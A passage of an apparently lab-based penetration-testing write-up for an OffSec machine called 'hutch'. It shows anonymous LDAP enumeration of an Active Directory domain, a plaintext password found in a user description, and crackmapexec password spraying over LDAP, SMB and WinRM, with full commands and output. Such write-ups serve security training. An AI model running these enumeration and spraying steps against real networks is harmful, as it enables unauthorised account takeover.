distinguishedName: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20210216133934.0Z
uSNCreated: 12831
uSNChanged: 49179
name: Freddy McSorley
objectGUID:: TxilGIhMVkuei6KplCd8ug==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132489437036308102
lastLogoff: 0
lastLogon: 132579563744834908
pwdLastSet: 132489417058152751
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWwQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: fmcsorley
sAMAccountType: 805306368
userPrincipalName: fmcsorley@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z
lastLogonTimestamp: 132579563744834908
msDS-SupportedEncryptionTypes: 0

# Domain Administrator, Users, hutch.offsec
dn: CN=Domain Administrator,CN=Users,DC=hutch,DC=offsec

# Administrator, Users, hutch.offsec
dn: CN=Administrator,CN=Users,DC=hutch,DC=offsec

# Guest, Users, hutch.offsec
dn: CN=Guest,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Guest
description: Built-in account for guest access to the computer/domain
distinguishedName: CN=Guest,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104052540.0Z
whenChanged: 20201104052540.0Z
uSNCreated: 8197
memberOf: CN=Guests,CN=Builtin,DC=hutch,DC=offsec
uSNChanged: 8197
name: Guest
objectGUID:: VKtEAAOQ8ki8PKRBs7xH+A==
userAccountControl: 66082
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 514
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGn9QEAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Guest
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 20201104052623.0Z
dSCorePropagationData: 16010101000417.0Z

# search result
search: 2
result: 0 Success

# numResponses: 38
# numEntries: 37
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$
```

### More focused
```bash
┌──(kali㉿kali)-[~]
└─$ ldapsearch -x -h 192.168.234.122 -D '' -w '' -b "CN=Users,DC=hutch,DC=offsec" | grep sAMAccountName                                                            32 ⨯
sAMAccountName: Domain Computers
sAMAccountName: Cert Publishers
sAMAccountName: Domain Users
sAMAccountName: Domain Guests
sAMAccountName: Group Policy Creator Owners
sAMAccountName: RAS and IAS Servers
sAMAccountName: Allowed RODC Password Replication Group
sAMAccountName: Denied RODC Password Replication Group
sAMAccountName: Enterprise Read-only Domain Controllers
sAMAccountName: Cloneable Domain Controllers
sAMAccountName: Protected Users
sAMAccountName: DnsAdmins
sAMAccountName: DnsUpdateProxy
sAMAccountName: rplacidi
sAMAccountName: opatry
sAMAccountName: ltaunton
sAMAccountName: acostello
sAMAccountName: jsparwell
sAMAccountName: oknee
sAMAccountName: jmckendry
sAMAccountName: avictoria
sAMAccountName: jfrarey
sAMAccountName: eaburrow
sAMAccountName: cluddy
sAMAccountName: agitthouse
sAMAccountName: fmcsorley
sAMAccountName: Guest
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ ldapsearch -x -h 192.168.234.122 -D '' -w '' -b "CN=Users,DC=hutch,DC=offsec" | grep description                                                                1 ⚙
description: All workstations and servers joined to the domain
description: Members of this group are permitted to publish certificates to th
description: All domain users
description: All domain guests
description: Members in this group can modify group policy for the domain
description: Servers in this group can access remote access properties of user
description: Members in this group can have their passwords replicated to all 
description: Members in this group cannot have their passwords replicated to a
description: Members of this group are Read-Only Domain Controllers in the ent
description: Members of this group that are domain controllers may be cloned.
description: Members of this group are afforded additional protections against
description: DNS Administrators Group
description: DNS clients who are permitted to perform dynamic updates on behal
description: Password set to CrabSharkJellyfish192 at user's request. Please c
description: Built-in account for guest access to the computer/domain
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

# Exploitation

## Password Spraying

```bash
┌──(kali㉿kali)-[/tmp]
└─$ cat user.txt                                                                                                                                                1 ⨯ 1 ⚙
rplacidi
opatry
ltaunton
acostello
jsparwell
oknee
jmckendry
avictoria
jfrarey
eaburrow
cluddy
agitthouse
fmcsorley

┌──(kali㉿kali)-[/tmp]
└─$ crackmapexec ldap 192.168.234.122 -u user.txt -p CrabSharkJellyfish192 --kdcHost 192.168.234.122
LDAP        192.168.234.122 389    HUTCHDC          [*] Windows 10.0 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
LDAP        192.168.234.122 389    HUTCHDC          [-] hutch.offsec\rplacidi:CrabSharkJellyfish192
LDAP        192.168.234.122 389    HUTCHDC          [-] hutch.offsec\opatry:CrabSharkJellyfish192
LDAP        192.168.234.122 389    HUTCHDC          [-] hutch.offsec\ltaunton:CrabSharkJellyfish192
LDAP        192.168.234.122 389    HUTCHDC          [-] hutch.offsec\acostello:CrabSharkJellyfish192
LDAP        192.168.234.122 389    HUTCHDC          [-] hutch.offsec\jsparwell:CrabSharkJellyfish192
LDAP        192.168.234.122 389    HUTCHDC          [-] hutch.offsec\oknee:CrabSharkJellyfish192
LDAP        192.168.234.122 389    HUTCHDC          [-] hutch.offsec\jmckendry:CrabSharkJellyfish192
LDAP        192.168.234.122 389    HUTCHDC          [-] hutch.offsec\avictoria:CrabSharkJellyfish192
LDAP        192.168.234.122 389    HUTCHDC          [-] hutch.offsec\jfrarey:CrabSharkJellyfish192
LDAP        192.168.234.122 389    HUTCHDC          [-] hutch.offsec\eaburrow:CrabSharkJellyfish192
LDAP        192.168.234.122 389    HUTCHDC          [-] hutch.offsec\cluddy:CrabSharkJellyfish192
LDAP        192.168.234.122 389    HUTCHDC          [-] hutch.offsec\agitthouse:CrabSharkJellyfish192
LDAP        192.168.234.122 389    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192 


																																										┌──(kali㉿kali)-[/tmp]
└─$ crackmapexec smb 192.168.234.122 -u user.txt -p CrabSharkJellyfish192 --kdcHost 192.168.234.122
SMB         192.168.234.122 445    HUTCHDC          [*] Windows 10.0 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.234.122 445    HUTCHDC          [-] hutch.offsec\rplacidi:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.234.122 445    HUTCHDC          [-] hutch.offsec\opatry:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.234.122 445    HUTCHDC          [-] hutch.offsec\ltaunton:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.234.122 445    HUTCHDC          [-] hutch.offsec\acostello:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.234.122 445    HUTCHDC          [-] hutch.offsec\jsparwell:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.234.122 445    HUTCHDC          [-] hutch.offsec\oknee:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.234.122 445    HUTCHDC          [-] hutch.offsec\jmckendry:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.234.122 445    HUTCHDC          [-] hutch.offsec\avictoria:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.234.122 445    HUTCHDC          [-] hutch.offsec\jfrarey:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.234.122 445    HUTCHDC          [-] hutch.offsec\eaburrow:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.234.122 445    HUTCHDC          [-] hutch.offsec\cluddy:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.234.122 445    HUTCHDC          [-] hutch.offsec\agitthouse:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.234.122 445    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192 

┌──(kali㉿kali)-[/tmp]
└─$ crackmapexec winrm 192.168.234.122 -u user.txt -p CrabSharkJellyfish192 --kdcHost 192.168.234.122
WINRM       192.168.234.122 5985   HUTCHDC          [*] Windows 10.0 Build 17763 (name:HUTCHDC) (domain:hutch.offsec)
WINRM       192.168.234.122 5985   HUTCHDC          [*] http://192.168.234.122:5985/wsman
WINRM       192.168.234.122 5985   HUTCHDC          [-] hutch.offsec\rplacidi:CrabSharkJellyfish192
WINRM       192.168.234.122 5985   HUTCHDC          [-] hutch.offsec\opatry:CrabSharkJellyfish192
WINRM       192.168.234.122 5985   HUTCHDC          [-] hutch.offsec\ltaunton:CrabSharkJellyfish192
WINRM       192.168.234.122 5985   HUTCHDC          [-] hutch.offsec\acostello:CrabSharkJellyfish192
WINRM       192.168.234.122 5985   HUTCHDC          [-] hutch.offsec\jsparwell:CrabSharkJellyfish192
WINRM       192.168.234.122 5985   HUTCHDC          [-] hutch.offsec\oknee:CrabSharkJellyfish192
WINRM       192.168.234.122 5985   HUTCHDC          [-] hutch.offsec\jmckendry:CrabSharkJellyfish192
WINRM       192.168.234.122 5985   HUTCHDC          [-] hutch.offsec\avictoria:CrabSharkJellyfish192
WINRM       192.168.234.122 5985   HUTCHDC          [-] hutch.offsec\jfrarey:CrabSharkJellyfish192
WINRM       192.168.234.122 5985   HUTCHDC          [-] hutch.offsec\eaburrow:CrabSharkJellyfish192
WINRM       192.168.234.122 5985   HUTCHDC          [-] hutch.offsec\cluddy:CrabSharkJellyfish192
WINRM       192.168.234.122 5985   HUTCHDC          [-] hutch.offsec\agitthouse:CrabSharkJellyfish192
WINRM       192.168.234.122 5985   HUTCHDC          [-] hutch.offsec\fmcsorley:CrabSharkJellyfish192
                                              
┌──(kali㉿kali)-[/tmp]
└─$ 
```

# Privesc

# Others